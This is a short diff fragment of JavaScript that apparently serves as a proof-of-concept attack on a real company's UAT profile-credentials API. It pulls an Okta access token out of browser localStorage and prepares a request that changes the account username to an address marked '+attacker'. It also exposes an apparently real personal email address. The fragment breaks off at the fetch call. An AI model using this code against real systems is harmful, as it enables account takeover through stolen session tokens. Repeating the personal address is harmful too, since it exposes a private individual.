@@ -2,7 +2,7 @@ const apiUrl = 'https://uat-my2.veteransunited.com/api/v2/profiles/credentials';
 const token = JSON.parse(localStorage.getItem('okta-token-storage')).accessToken.accessToken;
 
 const requestData = {
-  username: 'dmxjon1@gmail.com'
+  username: 'dmxjon1+attacker@gmail.com'
 };
 
 fetch(apiUrl, {
